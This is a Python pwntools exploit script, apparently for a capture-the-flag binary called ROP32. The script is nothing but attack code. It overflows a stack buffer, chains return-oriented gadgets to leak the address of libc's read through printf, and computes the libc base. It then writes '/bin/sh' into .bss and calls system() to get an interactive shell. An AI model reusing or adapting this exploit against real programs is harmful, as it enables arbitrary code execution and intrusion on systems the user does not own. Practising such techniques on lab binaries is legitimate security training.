from pwn import *

p = process('./ROP32')
e = ELF('./ROP32')
l = e.libc

pppr = 0x8048559
ppr = 0x804855a
pr = 0x804855b

payload = 'A'*0x3a
payload += 'A'*4
payload += p32(e.plt['printf'])
payload += p32(pr)
payload += p32(e.got['read'])

payload += p32(e.plt['read'])
payload += p32(pppr)
payload += p32(0)
payload += p32(e.bss()+0x100)
payload += p32(8)

payload += p32(e.symbols['main'])

p.sendafter(': ', payload)
base = u32(p.recv(4)[-4:])
base = base - l.symbols['read']
print hex(base)
p.send('/bin/sh\x00')

payload = 'A'*0x3a
payload += 'A'*4
payload += p32(base + l.symbols['system'])
payload += p32(pr)
payload += p32(e.bss()+0x100)

p.send(payload)

p.interactive()
